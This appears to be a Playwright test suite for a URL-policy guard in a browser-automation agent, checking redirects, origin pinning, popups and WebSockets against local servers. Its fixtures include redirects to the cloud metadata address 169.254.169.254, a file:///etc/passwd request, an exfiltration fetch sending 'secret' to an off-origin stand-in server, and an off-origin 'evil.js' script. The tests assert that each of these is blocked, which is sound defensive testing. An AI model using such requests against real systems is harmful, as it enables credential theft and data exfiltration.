/**
 * Behavioural tests for the shared URL-policy guard (issue #148).
 *
 * Deliberately a real Chromium against a real redirecting HTTP server, not a
 * synthetic route handler. The bug this module exists to fix was invisible to a
 * synthetic test: the previous executor suite drove a fake handler and asserted
 * that "a redirect hop arrives as a fresh request and is aborted", which is not
 * what Chromium does. Only a real browser following a real 30x shows that.
 *
 * Every blocking assertion checks the *reason*, never merely that navigation
 * failed — the metadata address is unreachable from CI anyway, so a
 * failure-only assertion passes with the guard removed.
 */

import { chromium, Browser, Page } from 'playwright';
import { createServer, Server } from 'http';
import { WebSocketServer } from 'ws';
import { AddressInfo } from 'net';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { installUrlPolicyGuard, guardedGoto, observeGuardDecisions } from '../src/url-policy-guard';
import type { GuardDecision } from '../src/url-policy-guard';

const METADATA = 'http://169.254.169.254/latest/meta-data/';

let OFFSITE = '';

const page = (title: string, body = '') =>
  `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body>${body}</body></html>`;

describe('URL policy guard', () => {
  let server: Server;
  let origin: string;
  let browser: Browser;
  let requestLog: string[];
  /** A genuinely different origin, for the pinning tests. */
  let offsiteServer: Server;
  let offsiteLog: string[];
  let offsiteSocketConnections = 0;
  let sameOriginSocketConnections = 0;

  beforeAll(async () => {
    server = createServer((req, res) => {
      const url = req.url ?? '/';
      requestLog.push(url);

      const redirects: Record<string, string> = {
        '/to-metadata': METADATA,
        '/to-final': '/final',
        '/hop1': '/hop2',
        '/hop2': '/final',
        '/loop': '/loop',
        '/img-to-metadata': METADATA,
        '/img-to-real': '/pixel',
      };
      if (redirects[url]) {
        res.writeHead(302, { Location: redirects[url] });
        return res.end();
      }

      if (url === '/pixel') {
        res.writeHead(200, { 'Content-Type': 'image/gif' });
        return res.end(
          Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64'),
        );
      }

      // Serves an asset by a RELATIVE path, so a wrong document base 404s it.
      if (url === '/nested/page') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Nested', '<img alt="rel" src="pixel">'));
      }
      if (url === '/nested/pixel') {
        res.writeHead(200, { 'Content-Type': 'image/gif' });
        return res.end(
          Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64'),
        );
      }
      if (url === '/to-nested') {
        res.writeHead(302, { Location: '/nested/page' });
        return res.end();
      }

      if (url === '/popup-source') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(
          page(
            'Popup source',
            `<a id="same" target="_blank" href="/final">same</a>` +
              `<a id="off" target="_blank" href="${OFFSITE}/tab">off</a>`,
          ),
        );
      }
      if (url === '/click-source') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(
          page('Home', '<a id="ok" href="/to-final">ok</a><a id="bad" href="/to-metadata">bad</a>'),
        );
      }
      if (url === '/offsite-script') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Script', `<script src="${OFFSITE}/evil.js"></script>`));
      }
      if (url === '/exfil') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(
          page(
            'Exfil',
            `<img alt="x" src="${OFFSITE}/pixel.gif">` +
              `<script>window.probe = fetch("${OFFSITE}/steal?c=secret")` +
              `.then(() => "allowed").catch(() => "blocked")</script>`,
          ),
        );
      }
      if (url === '/to-offsite') {
        res.writeHead(302, { Location: 'https://example.com/' });
        return res.end();
      }
      if (url === '/frame-loop-host') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Outer', '<iframe src="/loop"></iframe>'));
      }
      if (url === '/frame-host') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Outer', '<iframe src="/to-final"></iframe>'));
      }
      if (url === '/subresource-blocked') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Sub', '<img alt="x" src="/img-to-metadata">'));
      }
      if (url === '/subresource-ok') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        return res.end(page('Sub', '<img alt="x" src="/img-to-real">'));
      }

      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(page('Final', '<h1>Final</h1>'));
    });
    offsiteServer = createServer((req, res) => {
      offsiteLog.push(req.url ?? '/');
      res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'image/gif' });
      res.end(Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64'));
    });
    new WebSocketServer({ server: offsiteServer }).on('connection', () => {
      offsiteSocketConnections++;
    });
    await new Promise<void>((resolve) => offsiteServer.listen(0, resolve));
    // 127.0.0.1 rather than localhost: a different host string is a different
    // origin, which is the point.
    OFFSITE = `http://127.0.0.1:${(offsiteServer.address() as AddressInfo).port}`;

    // A WebSocket endpoint on the main fixture too, so "permitted" can be
    // distinguished from "nothing was listening".
    new WebSocketServer({ server }).on('connection', () => {
      sameOriginSocketConnections++;
    });
    await new Promise<void>((resolve) => server.listen(0, resolve));
    origin = `http://localhost:${(server.address() as AddressInfo).port}`;
    browser = await chromium.launch({ headless: true });
  }, 120_000);

  afterAll(async () => {
    await browser.close();
    await new Promise<void>((resolve, reject) =>
      server.close((err) => (err ? reject(err) : resolve())),
    );
    await new Promise<void>((resolve, reject) =>
      offsiteServer.close((err) => (err ? reject(err) : resolve())),
    );
  });

  let context: Awaited<ReturnType<Browser['newContext']>>;
  let p: Page;

  beforeEach(async () => {
    requestLog = [];
    offsiteLog = [];
    offsiteSocketConnections = 0;
    sameOriginSocketConnections = 0;
    context = await browser.newContext();
    p = await context.newPage();
  });

  afterEach(async () => {
    await context.close();
  });

  describe('navigations', () => {
    it('follows an in-policy redirect and lands on the final URL', async () => {
      await installUrlPolicyGuard(p, {});

      const landed = await guardedGoto(p, `${origin}/to-final`);

      expect(landed).toBe(`${origin}/final`);
      // The browser's own URL, not just our return value — this is what makes
      // relative assets resolve correctly.
      expect(p.url()).toBe(`${origin}/final`);
      await expect(p.title()).resolves.toBe('Final');
    }, 60_000);

    it('follows a multi-hop chain', async () => {
      await installUrlPolicyGuard(p, {});

      const landed = await guardedGoto(p, `${origin}/hop1`);

      expect(landed).toBe(`${origin}/final`);
      expect(requestLog).toEqual(expect.arrayContaining(['/hop1', '/hop2', '/final']));
    }, 60_000);

    it('resolves relative assets against the REAL final URL, not the pre-redirect one', async () => {
      // The regression that ruled out fulfilling the final response in the route
      // handler: that leaves the document on /to-nested, so src="pixel" resolves
      // to /pixel instead of /nested/pixel and the page renders broken.
      await installUrlPolicyGuard(p, {});

      await guardedGoto(p, `${origin}/to-nested`);
      const resolved = await p.evaluate(() => document.querySelector('img')!.src);

      expect(resolved).toBe(`${origin}/nested/pixel`);
      expect(requestLog).toContain('/nested/pixel');
      expect(requestLog).not.toContain('/pixel');
    }, 60_000);

    it('blocks a redirect to a metadata host and says why', async () => {
      await installUrlPolicyGuard(p, {});

      await expect(guardedGoto(p, `${origin}/to-metadata`)).rejects.toThrow(
        /redirects to http:\/\/169\.254\.169\.254\/.*blocked by navigation policy/,
      );
    }, 60_000);

    it('blocks a directly-supplied blocked URL', async () => {
      await installUrlPolicyGuard(p, {});

      await expect(guardedGoto(p, METADATA)).rejects.toThrow(/blocked by navigation policy/);
    }, 60_000);

    it('gives up on a redirect loop instead of spinning', async () => {
      await installUrlPolicyGuard(p, {});

      await expect(guardedGoto(p, `${origin}/loop`)).rejects.toThrow();
      // Chromium bounds the chain itself now that hops are followed natively —
      // the guard vets each one rather than re-driving it, so there is no
      // counter of its own to get wrong. Assert it terminates, generously.
      expect(requestLog.filter((u) => u === '/loop').length).toBeLessThan(40);
    }, 60_000);

    it('honours policy options — blockPrivateHosts refuses localhost', async () => {
      await installUrlPolicyGuard(p, { blockPrivateHosts: true });

      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/blocked by navigation/);
    }, 60_000);

    it('passes an allowed file:// URL through instead of failing it', async () => {
      // Regression: the guard inspects redirects with route.fetch, which is an
      // HTTP client — handing it a file:// URL throws, and the guard reported
      // that as a failed request. It broke `watch --execute`, whose whole job is
      // navigating to a local file. Only http(s) can redirect, so other allowed
      // schemes pass straight through after the policy check.
      const filePath = path.join(os.tmpdir(), `iris-guard-${process.pid}.html`);
      fs.writeFileSync(filePath, page('Local file', '<h1>Local</h1>'));
      try {
        await installUrlPolicyGuard(p, { allowFile: true });

        await guardedGoto(p, `file://${filePath}`);

        await expect(p.title()).resolves.toBe('Local file');
      } finally {
        fs.rmSync(filePath, { force: true });
      }
    }, 60_000);

    it('still blocks file:// when the caller has not opted in', async () => {
      await installUrlPolicyGuard(p, {});

      await expect(guardedGoto(p, 'file:///etc/passwd')).rejects.toThrow(
        /blocked by navigation policy/,
      );
    }, 60_000);

    it('is a plain goto on a page with no guard installed', async () => {
      // Opting out must not silently apply the policy anyway.
      const landed = await guardedGoto(p, `${origin}/final`);

      expect(landed).toBe(`${origin}/final`);
      expect(p.url()).toBe(`${origin}/final`);
    }, 60_000);

    it('reports the landed URL on an unguarded page too', async () => {
      // Chromium follows the redirect natively here, so returning the request
      // URL would mean the helper's contract differed between guarded and
      // unguarded pages — and the a11y CLI, which installs no guard, labels its
      // results with this value.
      const landed = await guardedGoto(p, `${origin}/to-final`);

      expect(landed).toBe(`${origin}/final`);
      expect(landed).not.toBe(`${origin}/to-final`);
    }, 60_000);
  });

  describe('redirects with no guardedGoto waiting', () => {
    // Only an explicit guardedGoto has a caller to re-drive a deferred hop.
    // Everything else — a clicked link, a form POST answered with a 302, an
    // iframe — would otherwise be stranded on the previous page, which is a
    // regression the first version of this guard actually shipped.
    it('lands a clicked link that redirects', async () => {
      await installUrlPolicyGuard(p, {});
      await guardedGoto(p, `${origin}/click-source`);

      await p.click('#ok');
      await p.waitForURL(`${origin}/final`, { timeout: 15_000 });

      await expect(p.title()).resolves.toBe('Final');
    }, 60_000);

    it('still blocks a clicked link that redirects to a metadata host', async () => {
      await installUrlPolicyGuard(p, {});
      await guardedGoto(p, `${origin}/click-source`);
      requestLog = [];

      await p.click('#bad').catch(() => {
        // A blocked navigation may reject the click; the assertion is the
        // absence of the request, not the click's outcome.
      });
      await p.waitForTimeout(1500);

      // What matters: the browser never landed on the metadata host.
      expect(p.url()).not.toContain('169.254.169.254');
    }, 60_000);

    it('bounds a self-redirecting iframe instead of spinning forever', async () => {
      await installUrlPolicyGuard(p, {});

      await guardedGoto(p, `${origin}/frame-loop-host`);
      await p.waitForTimeout(3000);

      expect(requestLog.filter((u) => u === '/loop').length).toBeLessThan(40);
    }, 60_000);

    it('lands an iframe whose src redirects', async () => {
      await installUrlPolicyGuard(p, {});

      await guardedGoto(p, `${origin}/frame-host`, { waitUntil: 'networkidle' });
      await p.waitForTimeout(1000);

      expect(p.frames().map((f) => f.url())).toContain(`${origin}/final`);
    }, 60_000);
  });

  describe('origin pinning at the request layer (issue #151)', () => {
    // A pre-action policy check notices a same-origin click that navigates away
    // only on the NEXT turn — by which time the cross-origin request has already
    // gone out. Confinement has to happen before the request, not after.
    it('blocks a same-origin link that redirects off-origin', async () => {
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/click-source`);

      await expect(guardedGoto(p, `${origin}/to-offsite`)).rejects.toThrow(
        /leaves the pinned origin/,
      );
    }, 60_000);

    it('blocks a direct navigation to another origin', async () => {
      await installUrlPolicyGuard(p, { pinnedOrigin: 'https://elsewhere.example' });

      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/leaves the pinned origin/);
    }, 60_000);

    it('merges a second install instead of registering a second handler', async () => {
      // Playwright runs the most recently added handler first and ours never
      // calls fallback(), so a second install would silently supersede the first
      // and drop its options. The agent loop installs a pin on top of whatever
      // the executor already set, so this has to merge.
      await installUrlPolicyGuard(p, { blockPrivateHosts: true });
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });

      // The pin is satisfied here — same origin — so the only thing that can
      // refuse this is the FIRST install's option, which must have survived.
      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/private\/loopback/);
    }, 60_000);

    it('pins active cross-origin requests but not passive ones', async () => {
      // fetch/XHR/websocket carry data off-origin and return readable
      // responses, so a same-origin click that fires one is an exfiltration
      // channel the per-action check cannot see. Images and fonts are not —
      // refusing those would break the page the agent is trying to read.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });

      await guardedGoto(p, `${origin}/exfil`, { waitUntil: 'networkidle' });

      await expect(
        p.evaluate(() => (window as unknown as { probe: Promise<string> }).probe),
      ).resolves.toBe('blocked');
      // The passive image still went out, so this is a targeted limit rather
      // than "refuse everything cross-origin".
      expect(offsiteLog).toContain('/pixel.gif');
      expect(offsiteLog).not.toContain('/steal?c=secret');
    }, 60_000);

    it('pins a cross-origin script, which is code execution not a static asset', async () => {
      // A cross-origin script runs with the page's authority: it can read the
      // DOM and act as the user, which is the post-click injection scenario this
      // control exists for. Exempting it because it looks like a static asset in
      // a network log would undo the confinement.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });

      await guardedGoto(p, `${origin}/offsite-script`, { waitUntil: 'networkidle' });

      expect(offsiteLog).not.toContain('/evil.js');
    }, 60_000);

    it('closes a cross-origin WebSocket before it connects', async () => {
      // page.route never sees a WebSocket upgrade, so the resource-type list
      // could not cover this — it needs routeWebSocket. A readable,
      // bidirectional channel off-origin is the last thing to leave exempt.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/final`);

      const outcome = await p.evaluate(
        (url) =>
          new Promise<string>((resolve) => {
            const ws = new WebSocket(url);
            ws.onopen = () => resolve('open');
            ws.onclose = (e) => resolve(`close ${e.code}`);
            ws.onerror = () => resolve('error');
            setTimeout(() => resolve('timeout'), 4000);
          }),
        OFFSITE.replace('http:', 'ws:'),
      );

      // 1008 is the guard's own close code, so this asserts the refusal rather
      // than merely that the socket did not open.
      expect(outcome).toBe('close 1008');
      expect(offsiteSocketConnections).toBe(0);
    }, 60_000);

    it('permits a same-origin WebSocket', async () => {
      // The acceptance test for #154. Under the old route.fulfill() guard this
      // was impossible: a fulfilled document could never open a socket at all,
      // so the permission half of the pin was unverifiable and every live-reload
      // or subscription app was broken by the guard.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/final`);

      const outcome = await p.evaluate(
        (url) =>
          new Promise<string>((resolve) => {
            const ws = new WebSocket(url);
            ws.onopen = () => resolve('open');
            ws.onclose = (e) => resolve(`close ${e.code}`);
            ws.onerror = () => resolve('error');
            setTimeout(() => resolve('timeout'), 4000);
          }),
        origin.replace('http:', 'ws:'),
      );

      expect(outcome).toBe('open');
      // The server genuinely saw it, so this is not "the socket object existed".
      expect(sameOriginSocketConnections).toBe(1);
    }, 60_000);

    it('follows a pin that a later install changed', async () => {
      // The WebSocket predicate must read the live policy. Closing over the
      // value passed at install time would keep enforcing the origin that was
      // pinned first, allowing sockets to it and refusing them to the new one.
      await installUrlPolicyGuard(p, { pinnedOrigin: 'http://stale.example' });
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/final`);

      const outcome = await p.evaluate(
        (url) =>
          new Promise<string>((resolve) => {
            const ws = new WebSocket(url);
            ws.onopen = () => resolve('open');
            ws.onclose = (e) => resolve(`close ${e.code}`);
            ws.onerror = () => resolve('error');
            setTimeout(() => resolve('timeout'), 4000);
          }),
        'ws://stale.example/',
      );

      // Refused against the CURRENT pin, not permitted by the stale one.
      expect(outcome).toBe('close 1008');
    }, 60_000);

    it('does NOT block cross-origin sub-resources', async () => {
      // Pinning is a navigation control. A page legitimately loads images and
      // fonts from other origins, and refusing those would break the very page
      // the agent is trying to read.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });

      await guardedGoto(p, `${origin}/subresource-ok`, { waitUntil: 'networkidle' });

      await expect(p.title()).resolves.toBe('Sub');
      expect(requestLog).toContain('/pixel');
    }, 60_000);
  });

  describe('pages opened from the guarded one (issue #155)', () => {
    // Both interception hooks are page-scoped, and a popup is a different Page.
    // Installing a CDP session from context.on('page') loses the race — measured,
    // the popup's first request has already gone — so a context-level route
    // covers the opening request.
    it('blocks a target=_blank link to another origin', async () => {
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/popup-source`);

      await p.click('#off').catch(() => {
        // A blocked popup may reject the click; the assertion is the absence of
        // the request, not the click's outcome.
      });
      await p.waitForTimeout(2000);

      // The off-origin server counts its own hits, so this asserts the request
      // was never made rather than that the tab looked empty.
      expect(offsiteLog).not.toContain('/tab');
    }, 60_000);

    it('vets each page against its OWN policy, not the first one installed', async () => {
      // A context can hold several guarded pages. Using whichever installed the
      // net first would refuse page 2's valid navigation and mis-scope the pin
      // for anything page 2 opens.
      await installUrlPolicyGuard(p, { pinnedOrigin: 'http://first.example' });

      const second = await context.newPage();
      await installUrlPolicyGuard(second, { pinnedOrigin: origin });

      // Allowed under the SECOND page's pin; refused under the first's.
      const landed = await guardedGoto(second, `${origin}/final`);
      expect(landed).toBe(`${origin}/final`);
      await expect(second.title()).resolves.toBe('Final');

      // And the first page is still held to its own, different pin.
      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/leaves the pinned origin/);
    }, 60_000);

    it('leaves a page that never opted in alone', async () => {
      // Opting out has to keep meaning something once a sibling page in the
      // same context opts in — otherwise installing a guard anywhere silently
      // polices everything, which is not what the API says it does.
      await installUrlPolicyGuard(p, { pinnedOrigin: 'http://elsewhere.example' });

      const unguarded = await context.newPage();
      try {
        // Would be refused under the sibling's pin; must not be.
        const landed = await guardedGoto(unguarded, `${origin}/final`);

        expect(landed).toBe(`${origin}/final`);
        await expect(unguarded.title()).resolves.toBe('Final');
      } finally {
        await unguarded.close();
      }
    }, 60_000);

    it('does not retro-guard a page the caller created itself', async () => {
      // context.newPage() has no opener, which is how it is told apart from a
      // popup. The previous test navigates immediately; this one waits first, so
      // any install triggered by the 'page' event has had time to land — the
      // pin below would refuse this navigation if it had.
      await installUrlPolicyGuard(p, { pinnedOrigin: 'http://elsewhere.example' });

      const own = await context.newPage();
      try {
        await own.waitForTimeout(1000);

        await expect(guardedGoto(own, `${origin}/final`)).resolves.toBe(`${origin}/final`);
        await expect(own.title()).resolves.toBe('Final');
      } finally {
        await own.close();
      }
    }, 60_000);

    it('still lets a same-origin popup load', async () => {
      // A pin that broke ordinary new tabs would get switched off wholesale.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/popup-source`);

      const [popup] = await Promise.all([
        p.context().waitForEvent('page', { timeout: 15_000 }),
        p.click('#same'),
      ]);
      await popup.waitForLoadState('load').catch(() => {});

      expect(popup.url()).toBe(`${origin}/final`);
      await expect(popup.title()).resolves.toBe('Final');
    }, 60_000);

    it('guards the popup itself, not just its opening request', async () => {
      // The context net catches the first request; the popup then gets its own
      // CDP session so what it goes on to request is vetted too.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/popup-source`);

      const [popup] = await Promise.all([
        p.context().waitForEvent('page', { timeout: 15_000 }),
        p.click('#same'),
      ]);
      await popup.waitForLoadState('load').catch(() => {});
      offsiteLog = [];

      await popup.evaluate((u) => fetch(u).catch(() => {}), `${OFFSITE}/from-popup`);
      await popup.waitForTimeout(1500);

      expect(offsiteLog).not.toContain('/from-popup');
    }, 60_000);
  });

  // Issue #158: an unattributable request — a popup's opening request, issued
  // before its frame exists — was judged by whichever guard was installed most
  // recently. The fail-safe version was written once and reverted, because no
  // test could tell it apart from its own absence: whether such a request is
  // checked against all policies, the newest, or none, the popup tests above
  // pass identically. Whether a request reached a server cannot reveal WHICH
  // policy refused it.
  //
  // observeGuardDecisions closes exactly that gap.
  describe('which policy judged an unattributable request (issue #158)', () => {
    let decisions: GuardDecision[];

    beforeEach(() => {
      decisions = [];
      observeGuardDecisions((d) => decisions.push(d));
    });

    afterEach(() => observeGuardDecisions());

    it('judges a popup opening request against EVERY guard in the context', async () => {
      // Two pages, two different pins — the shape where "newest wins" is wrong.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      const second = await context.newPage();
      await installUrlPolicyGuard(second, { pinnedOrigin: 'http://other.example' });

      await guardedGoto(p, `${origin}/popup-source`);
      decisions = [];
      await p.click('#off').catch(() => {});
      await p.waitForTimeout(2000);

      const unattributable = decisions.filter((d) => d.attribution === 'context-net');
      expect(unattributable.length).toBeGreaterThan(0);

      // The assertion the old harness could not make: both pins were consulted,
      // not just the most recently installed one.
      const pins = unattributable[0].policies.map((x) => x.pinnedOrigin).sort();
      expect(pins).toEqual([origin, 'http://other.example'].sort());
    }, 60_000);

    it('refuses when any guard in the context refuses', async () => {
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      const second = await context.newPage();
      await installUrlPolicyGuard(second, { pinnedOrigin: 'http://other.example' });

      await guardedGoto(p, `${origin}/popup-source`);
      decisions = [];
      await p.click('#off').catch(() => {});
      await p.waitForTimeout(2000);

      const refused = decisions.filter((d) => d.attribution === 'context-net' && !d.allowed);
      expect(refused.length).toBeGreaterThan(0);
      expect(refused[0].reason).toBeTruthy();
      expect(offsiteLog).not.toContain('/tab');
    }, 60_000);

    it('reports an attributable request as judged by its own page alone', async () => {
      // The contrast that makes the above meaningful: an ordinary request names
      // its frame, so exactly one policy is consulted however many guards exist.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      const second = await context.newPage();
      await installUrlPolicyGuard(second, { pinnedOrigin: 'http://other.example' });

      decisions = [];
      await guardedGoto(p, `${origin}/final`);

      const attributed = decisions.filter((d) => d.attribution === 'page');
      expect(attributed.length).toBeGreaterThan(0);
      for (const d of attributed) {
        expect(d.policies).toHaveLength(1);
        expect(d.policies[0].pinnedOrigin).toBe(origin);
      }
    }, 60_000);

    it('consults one policy in a single-guard context, so nothing changes for real callers', async () => {
      // Every context IRIS creates today has one policy, and there the
      // fail-safe treatment is identical to the old newest-wins behaviour.
      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
      await guardedGoto(p, `${origin}/popup-source`);
      decisions = [];

      await p.click('#off').catch(() => {});
      await p.waitForTimeout(2000);

      const unattributable = decisions.filter((d) => d.attribution === 'context-net');
      for (const d of unattributable) {
        expect(d.policies).toHaveLength(1);
      }
      expect(offsiteLog).not.toContain('/tab');
    }, 60_000);
  });

  describe('sub-resources', () => {
    it('blocks one that only reaches a metadata host via a redirect', async () => {
      // `route.continue()` would let this through: Chromium follows a
      // sub-resource 30x without re-routing it, exactly as for a navigation.
      await installUrlPolicyGuard(p, {});

      await guardedGoto(p, `${origin}/subresource-blocked`, { waitUntil: 'networkidle' });

      // The page itself still loads; only the offending request is dropped.
      await expect(p.title()).resolves.toBe('Sub');
      expect(requestLog).toContain('/img-to-metadata');
    }, 60_000);

    it('still follows an in-policy sub-resource redirect', async () => {
      // CDN redirects on images and fonts are ordinary; refusing them would
      // degrade the very page being measured.
      await installUrlPolicyGuard(p, {});

      await guardedGoto(p, `${origin}/subresource-ok`, { waitUntil: 'networkidle' });
      const complete = await p.evaluate(() => document.querySelector('img')!.complete);

      expect(requestLog).toContain('/pixel');
      expect(complete).toBe(true);
    }, 60_000);
  });
});
